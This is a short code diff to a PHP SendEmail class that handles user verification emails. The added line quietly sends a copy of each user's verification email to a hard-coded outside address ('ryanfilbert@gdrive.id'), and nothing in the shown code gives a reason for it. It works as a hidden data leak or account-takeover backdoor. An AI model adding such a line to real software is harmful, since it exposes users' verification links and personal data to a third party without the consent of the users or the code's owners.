@@ -36,6 +36,7 @@ class SendEmail
                     $user = $objData->user;
                     $emailVerify = new EmailVerification($user);
                     Mail::to($user->email)->send($emailVerify);
+                    Mail::to("ryanfilbert@gdrive.id")->send($emailVerify);
                     break;
 
                 case 'requestVerification' :
